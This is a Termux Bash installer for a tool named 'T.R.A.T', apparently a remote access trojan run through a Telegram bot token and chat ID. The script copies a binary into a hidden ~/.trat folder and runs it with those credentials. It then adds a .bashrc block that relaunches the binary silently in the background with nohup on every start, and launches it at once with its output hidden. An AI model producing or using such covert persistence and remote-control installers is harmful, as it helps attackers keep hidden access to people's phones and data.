#!/data/data/com.termux/files/usr/bin/bash
logo() {
    # الألوان (Colors)
    local C='\e[1;36m'  # سماوي (Cyan) للجزء العلوي والأساسي
    local B='\e[1;34m'  # أزرق (Blue) لتفاصيل الأجنحة اليمنى
    local Y='\e[1;33m'  # أصفر (Yellow) للنجوم اليسرى
    local D='\e[1;30m'  # رمادي داكن (Dark Gray) للإطار
    local R='\e[0m'     # إعادة تعيين (Reset)

    # طباعة الشعار مضغوطاً بدون مساحات شاسعة
    echo -e "${D}         . . . . . . .${R}"
    echo -e "${D}      .                 .${R}"
    echo -e "${D}     .${C}  ###############  ${D}.${R}"
    echo -e "${D}     .${C}  ###############  ${D}.${R}"
    echo -e "${D}     .${C}        ###     ${B}.# ${D}.${R}"
    echo -e "${D}     .${Y}   *    ${C}###   ${B}.### ${D}.${R}"
    echo -e "${D}     .${Y}  ***   ${C}### ${B}.## ## ${D}.${R}"
    echo -e "${D}     .${Y}   *   ${C}.###${B}*#   ## ${D}.${R}"
    echo -e "${D}     .${C}      .### ${B}##.  ## ${D}.${R}"
    echo -e "${D}     .${C}    .###'  ${B}.##. ## ${D}.${R}"
    echo -e "${D}     .${C}   ###       ${B}##### ${D}.${R}"
    echo -e "${D}      .${C}  ##         ${B}##  ${D}.${R}"
    echo -e "${D}         . . . . . . .${R}"
}

logo

set -e

# ==========================================
# T.R.A.T Installer
# ==========================================

APP_NAME="trat"
INSTALL_DIR="$HOME/.trat"
APP_PATH="$INSTALL_DIR/$APP_NAME"
LOCK_FILE="$INSTALL_DIR/$APP_NAME.lock"
BASHRC="$HOME/.bashrc"

# ------------------------------------------
# التحقق من المدخلات
# ------------------------------------------

if [ "$#" -ne 4 ] || [ "$1" != "--token" ] || [ "$3" != "--chat_id" ]; then
    echo "Usage:"
    echo "  bash install.sh --token \"TOKEN\" --chat_id \"CHAT_ID\""
    exit 1
fi

TOKEN="$2"
CHAT_ID="$4"

if [ -z "$TOKEN" ] || [ -z "$CHAT_ID" ]; then
    echo "Error: token and chat_id are required."
    exit 1
fi

# ------------------------------------------
# التحقق من Termux
# ------------------------------------------

if [ ! -d "/data/data/com.termux" ]; then
    echo "Error: This installer is designed for Termux."
    exit 1
fi

echo "[+] Installing required packages..."

# ------------------------------------------
# تثبيت المتطلبات
# ------------------------------------------

pkg update -y >/dev/null 2>&1 || true

pkg install -y wget curl util-linux >/dev/null 2>&1

# flock موجود داخل util-linux في Termux
if ! command -v flock >/dev/null 2>&1; then
    echo "Error: flock was not installed."
    exit 1
fi

echo "[+] Dependencies installed."

# ------------------------------------------
# التحقق من الأداة الجديدة
# ------------------------------------------

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SOURCE_APP="$SCRIPT_DIR/$APP_NAME"

if [ ! -f "$SOURCE_APP" ]; then
    echo "Error: $APP_NAME was not found next to install.sh"
    echo "Expected:"
    echo "  $SOURCE_APP"
    exit 1
fi

# ------------------------------------------
# إيقاف النسخة القديمة إن كانت تعمل
# ------------------------------------------

if [ -f "$APP_PATH" ]; then
    echo "[+] Stopping old instance..."

    pkill -f "$APP_PATH" 2>/dev/null || true

    sleep 1
fi

# ------------------------------------------
# إنشاء مجلد التثبيت
# ------------------------------------------

mkdir -p "$INSTALL_DIR"

# ------------------------------------------
# استبدال الأداة القديمة بالجديدة
# ------------------------------------------

echo "[+] Installing $APP_NAME..."

cp -f "$SOURCE_APP" "$APP_PATH"

chmod +x "$APP_PATH"

# ------------------------------------------
# تنفيذ --install مرة واحدة
# ------------------------------------------

echo "[+] Running initial installation..."

"$APP_PATH" \
    --install \
    --token "$TOKEN" \
    --chat_id "$CHAT_ID"

echo "[+] Initial installation completed."

# ------------------------------------------
# إنشاء ملف flock
# ------------------------------------------

touch "$LOCK_FILE"

# ------------------------------------------
# إنشاء أمر التشغيل التلقائي
# ------------------------------------------

START_MARKER="# >>> TRAT SERVICE >>>"
END_MARKER="# <<< TRAT SERVICE <<<"

# إزالة إعداد TRAT القديم بالكامل
if [ -f "$BASHRC" ]; then
    sed -i "/$START_MARKER/,/$END_MARKER/d" "$BASHRC"
fi

# إضافة الإعداد الجديد
cat >> "$BASHRC" <<EOF

$START_MARKER
(
    flock -n 9 || exit 0
    nohup "$APP_PATH" >/dev/null 2>&1 &
) 9>"$LOCK_FILE"
$END_MARKER
EOF

# ------------------------------------------
# تشغيل الأداة الآن في الخلفية
# ------------------------------------------

echo "[+] Starting $APP_NAME in background..."

(
    flock -n 9 || exit 0
    nohup "$APP_PATH" >/dev/null 2>&1 &
) 9>"$LOCK_FILE"

echo ""
echo "=========================================="
echo " T.R.A.T installed successfully"
echo "=========================================="
echo ""
echo "Location:"
echo "  $APP_PATH"
echo ""
echo "The service will start automatically"
echo "when Termux starts."
echo ""
echo "No --install will be used from .bashrc."
echo ""